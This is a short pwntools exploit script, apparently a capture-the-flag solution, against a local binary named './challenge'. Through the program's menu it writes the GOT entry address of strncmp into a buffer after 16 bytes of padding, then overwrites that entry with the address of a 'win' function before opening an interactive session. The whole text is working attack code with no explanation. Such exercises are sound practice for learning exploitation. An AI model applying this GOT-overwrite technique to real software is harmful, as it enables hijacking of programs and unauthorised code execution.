from pwn import *

binary = "./challenge"
r = process(binary)
e = ELF(binary)

r.sendline(b"2")

payload = b"A" * 16
payload += p64(e.got['strncmp'])

r.sendline(payload)

r.sendline(b"3")
r.sendline(str(e.symbols['win']).encode())
r.sendline(b"4")

r.interactive()